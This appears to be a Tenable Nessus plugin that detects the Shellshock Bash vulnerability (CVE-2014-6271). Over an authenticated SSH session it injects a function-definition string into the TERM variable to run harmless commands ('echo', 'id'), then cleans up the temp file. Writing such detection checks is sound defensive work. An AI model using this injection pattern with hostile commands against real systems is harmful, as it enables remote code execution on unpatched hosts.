#TRUSTED 3a00155c50df40ea74cd049d0b9aa21033d7b42fd3dee78082ef4dbe38b20a50e8299adcd54ff5a43115cf46f1b5f19e2facd9250464ef283c3afd0ce04ef898d09cd9cb64b231bca628242b7565cdb4d6883d5c3d9ce0eda79f20f6a6f4b11c1b40a6ce1c32ef3fe3ee6194c43ba63261e8b016f773a8e310d00c84cd266ead3fe62bb568b4d4a5957ff1771ce6696222d5af13e344737427fff45ed7375ef0e08cbc7a9f726c62a82cf5ddd443d8e34f67e3dc1dc742e4dfa14886e9393bac6d5ed1eb7f33f8ea8a2bad1756a65fb1d127e1d5366d578afdad8ccea5928888438309eb0d34981b7491b47ddb98ffa034b929139dd8393fa9c0f3fd3400dec42494c2dd0e6331bbba307717d65ea1331e83eaa3a77e0cc3a04a6af644e0cf0073045a1cd874eae809c637c9758e3307af08b27a15c8c224127f7a1adaba70280c127efa8a1dea6a946ae5c52d4df1cbc8ff2beb4eab4dbe0c81b73d2314b66b008e236d0bea64272082c337ef40996e6c830a34b717507c29e47c1cf2bde451cdcbe99ef4b81571473325b334c723862c5d788c6978af7325c4648926eb2f6b84310213e47c43d088eec4cf0561036fca5f93fc285d4bc03dea5bfc42328c01869ff62f10b413a6e288e9a14d5bcbce824facbbb9c6b30438bb0db7aa2b9932f3957b8bd5b5096c7e6ef36efc21fe5dbea86fa974188c375807a843e9103963
#TRUST-RSA-SHA256 877eeea72f8bc94f75156d7d7bca0d3bdd71cff7ed17f2c5dd95882c02a7addd85f344b4ddaaa31740ba44b373e6a88fb1ef766330a2b3418ecb08c3532464c6827816e9855a64e1b2abedf2e70595b32e4728501e05ee733144155cb387046b0603b64a375ba3868728717742e5d79edf328b4726f9ea5185a51b694e62604de6428a54515066c1a4c0d10d609ba031548fdead98b9f7a8e26fa8a71e3e8582b7d95c59c53786df523bc3b4a409f7170046e35aec884dabdb2fc445059f74e410860def3166a961a111eecedb3757f6b2f2e49caaddf827a13c52c8be8dc3d8f8e70963e690d17f1092d9250f134b05d6ad543223bfc165127d637a9897d0c7652a51cd0c734917b848a6616b8560a50d02efac5ce778206fcfc727873710382deeb185c0ad29afd10900e23c701319894b7d59188c9543330bd25e657c8371fe2c5781b77003da161689b5bf106d867b65e6c8366d2e346c6cd5a9967824ca33ef7aa1c4364bb44d3e63a341b339353f0f6d9a4df5cda2b6629ea51be8e8a5513dd662065181b417bb399bfda3bd66f9892b080e6afd518ca4ce7377fd2d9b1c23304d2a0e8ea9b92a507f74fb782f1d06c07b6ed7ac6c1a121e4811a335265dd1044dec1ef7be2079b77a56c854fac287cf72678b2140730cf7800f19c131beb17efee18273db6ddadf130a0135613f6d66e3bac0dccf156c9b57035fdf45
#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(77823);
  script_version("1.30");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/12/05");

  script_cve_id("CVE-2014-6271");
  script_bugtraq_id(70103);
  script_xref(name:"EDB-ID", value:"34765");
  script_xref(name:"EDB-ID", value:"34766");
  script_xref(name:"IAVA", value:"2014-A-0142");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/07/28");
  script_xref(name:"CEA-ID", value:"CEA-2019-0240");

  script_name(english:"Bash Remote Code Execution (Shellshock)");

  script_set_attribute(attribute:"synopsis", value:
"A system shell on the remote host is vulnerable to command injection.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of Bash that is vulnerable to
command injection via environment variable manipulation. Depending on
the configuration of the system, an attacker could remotely execute
arbitrary code.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2014/q3/650");
  # https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dacf7829");
  script_set_attribute(attribute:"see_also", value:"https://www.invisiblethreat.ca/post/shellshock/");
  script_set_attribute(attribute:"solution", value:
"Update Bash.");
  script_set_attribute(attribute:"agent", value:"unix");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2014-6271");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Qmail SMTP Bash Environment Variable Injection (Shellshock)');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/09/24");

  script_set_attribute(attribute:"plugin_type", value:"local");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:bash");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2014-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ssh_get_info.nasl");
  script_require_ports("Services/ssh", 22);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("ssh_func.inc");
include("telnet_func.inc");
include("hostlevel_funcs.inc");
include("misc_func.inc");
include("data_protection.inc");

port = get_service(svc:"ssh", default:22, exit_on_fail:TRUE);
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

ret = ssh_open_connection();
if (!ret) audit(AUDIT_SOCK_FAIL, port, "SSH");

info_t = INFO_SSH;

filename = "nessus." + unixtime();
test_command = "echo Plugin output: $((1+1))";

term = "() { :;}; " + test_command + " > /tmp/" + filename;
command = "bash -c 'cat /tmp/" + filename + "'";
output = ssh_cmd(cmd:command, term:term, noexec:TRUE);
# attempt cleanup
cleanup = "rm /tmp/" + filename;
ssh_cmd(cmd:cleanup);

if ("Plugin output: 2" >!< output)
{
  if(info_t == INFO_SSH) ssh_close_connection();
  audit(AUDIT_HOST_NOT, "affected.");
}

test_command = "/usr/bin/id";
term2 = "() { :;}; " + test_command + " > /tmp/" + filename;
command = "bash -c 'cat /tmp/" + filename + "'";
output2 = ssh_cmd(cmd:command, term:term2, noexec:TRUE);
# attempt cleanup
cleanup = "rm /tmp/" + filename;
ssh_cmd(cmd:cleanup);

if(info_t == INFO_SSH) ssh_close_connection();

if (output2 =~ "uid=[0-9]+.*gid=[0-9]+.*")
{
  term = term2;
  output = output2;
}

report =
  '\n' + 'Nessus was able to set the TERM environment variable used in an SSH' +
  '\n' + 'connection to :' +
  '\n' +
  '\n' + term +
  '\n' +
  '\n' + 'and read the output from the file :' +
  '\n' +
  '\n' + data_protection::sanitize_uid(output:output) +
  '\n' +
  '\n' + 'Note: Nessus has attempted to remove the file /tmp/' + filename + '\n';

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  extra      : report
);

